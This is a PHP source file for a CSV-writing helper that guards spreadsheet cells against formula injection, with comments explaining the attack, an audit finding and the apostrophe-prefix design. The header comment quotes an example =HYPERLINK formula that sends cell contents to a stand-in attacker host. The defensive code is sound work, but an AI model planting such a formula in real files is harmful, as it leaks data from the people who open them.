<?php
/**
 * lib/Csv.php — writing a CSV that a spreadsheet will not execute.
 *
 * ── THE ATTACK ──────────────────────────────────────────────────────────
 * A spreadsheet treats a cell beginning `=`, `+`, `-` or `@` as a formula.
 * So does one beginning with a tab or a carriage return, which is how the
 * obvious version of this guard gets walked past. Somebody registering for
 * the summit as
 *
 *     =HYPERLINK("https://evil.example/?d="&A1&A2,"Click for agenda")
 *
 * has written a formula into a file that staff will open, and it runs on
 * open with their data and their network. It is their machine, inside the
 * office, with a file they had every reason to trust — which is what makes
 * it worth guarding against rather than shrugging at.
 *
 * ── WHY A FILE OF ITS OWN ───────────────────────────────────────────────
 * The escaping already existed and was correct, buried inline in
 * `MemberDesk::export()`. Three other exports — the summit, the academy
 * roster, the mentorship pairings — wrote user-typed names and messages
 * raw, because the guard was not somewhere they could reuse. A control
 * that lives inside one caller is a control the next caller does not know
 * about; findings M3 in the 27 October audit is the bill for that.
 *
 * ── WHY A LEADING APOSTROPHE ────────────────────────────────────────────
 * It is what spreadsheets read as "this cell is text". The alternative —
 * stripping the character — changes the data: a name really can begin
 * with a hyphen, and `-5` in an amount column means something. The
 * apostrophe is not part of the value and does not survive a paste into
 * another sheet.
 */
declare(strict_types=1);

final class Csv
{
    /**
     * One cell, safe to open.
     *
     * A number is left alone — `-5` and `+234...` are values, not
     * formulas, and prefixing them would turn a numeric column into text
     * and break the sums the export exists for.
     */
    public static function cell(mixed $v): string
    {
        if (is_bool($v)) return $v ? 'yes' : '';
        $s = (string) ($v ?? '');
        if ($s === '') return '';

        /* Tab and carriage return are triggers too, and are the ones the
           simple `strpbrk($s[0], '=+-@')` version misses — a cell can be
           written with a leading tab and still be read as a formula. */
        if (strpbrk($s[0], "=+-@\t\r") === false) return $s;

        /* A plain number, with or without a sign or spaces: a value. */
        if (preg_match('/^[+-]?\d[\d\s]*$/', $s)) return $s;

        return "'" . $s;
    }

    /** A whole row, every cell guarded. */
    public static function row(array $cells): array
    {
        return array_map(static fn($c) => self::cell($c), array_values($cells));
    }

    /** fputcsv, with the guard applied — the only line a caller needs. */
    public static function put($handle, array $cells): void
    {
        fputcsv($handle, self::row($cells), ',', '"', '');
    }
}
